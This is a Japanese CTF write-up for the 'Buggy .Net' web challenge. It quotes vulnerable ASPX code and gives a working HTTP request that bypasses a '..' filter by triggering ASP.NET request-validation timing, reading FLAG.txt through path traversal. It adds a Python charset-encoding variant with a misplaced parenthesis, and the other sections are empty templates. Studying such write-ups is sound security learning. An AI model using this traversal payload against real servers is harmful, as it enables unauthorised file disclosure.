# writeup
## 
https://github.com/orangetw/My-CTF-Web-Challenges#buggy.net  
https://ctftime.org/writeup/16802  
- **entrypoint**  
以下のソースが与えられる。  
明らかにLFIできそうだけど`Request.Form["filename"].Contains("..")`でそれを検知している。  
```aspx
bool isBad = false;
try {
    if ( Request.Form["filename"] != null ) {
        isBad = Request.Form["filename"].Contains("..") == true;
    }
} catch (Exception ex) {
    
} 

try {
    if (!isBad) {
        Response.Write(System.IO.File.ReadAllText(@"C:\inetpub\wwwroot\" + Request.Form["filename"]));
    }
} catch (Exception ex) {

}
```
サイトにアクセスすると以下のようにバージョンがわかり、ASP.NET 4.0だとわかる。  
```txt
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/10.0
X-AspNet-Version: 4.0.30319
X-Powered-By: ASP.NET
[...]
```
よくわからんけどどうやらASPの`Request.Form`に初めにアクセスするときに、
`validateRequest="false"`になっていない限り、ASPが自動で`Request.Form`や`Request.QueryString`の値
をチェックして`<x`みたいなXSSがないかどうか確認して、もし検知すれば例外をスローするらしい。  
そして、その例外をスローするのははじめに`Request`オブジェクトにアクセスしたときだけで、それ以降は
`Request.Form["filename"]`みたいにして普通に値を取り出せるらしい？？？  
そして、はじめに例外をスローするのに時間がかかるらしくて、はじめに例外をスローして、if文の中には
入らないけど例外でストップするのは、そのあとのLFIを実行した後になる、らしい？？？  
- **payload**  
```txt
GET / HTTP/1.1
Host: 52.197.162.211
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Referer: http://52.197.162.211/

filename=%2E%2E%5C%2E%2E%5CFLAG.txt&o=%3Cx
```
以下でも行けるらしい。`charset=ibm500`になってる…よくわからん…  
```python
from urllib import quote

s = lambda x: quote(x.encode('ibm500'))
print '%s=%s&x=%s' % (s('filename'), s('../../FLAG.txt', s('<x>'))
```
## 
https://github.com/orangetw/My-CTF-Web-Challenges#why-so-serials  
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  
## 
- **entrypoint**  
- **payload**  

# memo
